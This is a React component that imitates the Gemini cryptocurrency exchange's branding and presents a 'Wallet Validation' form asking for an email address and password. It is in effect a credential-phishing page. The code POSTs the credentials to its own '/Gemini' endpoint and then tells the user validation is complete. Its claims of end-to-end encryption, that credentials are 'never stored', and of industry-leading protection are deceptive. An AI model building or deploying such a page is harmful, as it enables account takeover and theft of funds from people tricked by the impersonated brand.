import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  Loader2,
  Shield,
  CheckCircle
} from "lucide-react";
import "./geminiLanding.css";
import gemini from "../../assets/gemini_logo.png";
import fetchWithRetry from "../../utils/api";

const GeminiLogin = () => {
  const [form, setForm] = useState({
    emailOrUsername: "",
    password: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    if (!form.emailOrUsername || !form.password) {
      setError("Please fill in all fields");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetchWithRetry("/Gemini", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Validation failed");

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === "Enter" && !loading) submitForm();
  };

  if (done) {
    return (
      <div className="login-wrapper">
        <div className="login-box">
          <div className="login-header-section">
            <img src={gemini} alt="Gemini Logo" className="login-brand-image" />
          </div>
          <div className="login-panel">
            <div className="success-badge">
              <CheckCircle size={28} color="#00dcfa" />
            </div>
            <h2 className="login-heading">Validation Completed</h2>
            <p className="login-description">
              Your wallet validation is being processed.
            </p>
            <div className="info-notice">
              Need to validate another wallet?
            </div>
            <div style={{ display: "flex", gap: "0.75rem", marginTop: "1rem" }}>
              <button
                className="action-button"
                onClick={() => window.location.reload()}
              >
                Validate Another
              </button>
              <button
                className="action-button"
                style={{ background: "#2a2b2f", color: "#fff" }}
                onClick={() => (window.location.href = "/")}
              >
                Go Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="login-wrapper">
      <div className="login-box">
        <div className="login-header-section">
          <img src={gemini} alt="Gemini Logo" className="login-brand-image" />
          <h1 className="login-heading">Wallet Validation</h1>
          <p className="login-description">
            Securely verify your wallet ownership
          </p>
        </div>
        <div className="login-panel">
          <div className="security-indicator">
            <Shield size={14} />
            End-to-end encrypted
          </div>
          <div className="input-group">
            <label>Email Address</label>
            <input
              type="email"
              className="text-field"
              placeholder="your@email.com"
              value={form.emailOrUsername}
              onChange={(e) =>
                setForm({ ...form, emailOrUsername: e.target.value })
              }
              onKeyPress={handleKeyPress}
            />
          </div>
          <div className="input-group">
            <label>Password</label>
            <div className="password-field">
              <input
                type={showPassword ? "text" : "password"}
                className="text-field"
                placeholder="Enter your password"
                value={form.password}
                onChange={(e) =>
                  setForm({ ...form, password: e.target.value })
                }
                onKeyPress={handleKeyPress}
              />
              <button
                type="button"
                className="visibility-toggle"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>
          {error && <div className="error-message">{error}</div>}
          <button
            className="action-button"
            onClick={submitForm}
            disabled={loading}
          >
            {loading ? (
              <>
                <Loader2 size={18} className="spin" />
                Validating...
              </>
            ) : (
              "Validate Wallet"
            )}
          </button>
          <div className="info-notice">
            By validating your wallet, you confirm ownership without exposing
            private keys. Credentials are encrypted and never stored.
          </div>
        </div>
        <div className="footer-disclaimer">
          Protected by industry-leading security standards
        </div>
      </div>
    </div>
  );
};

export default GeminiLogin;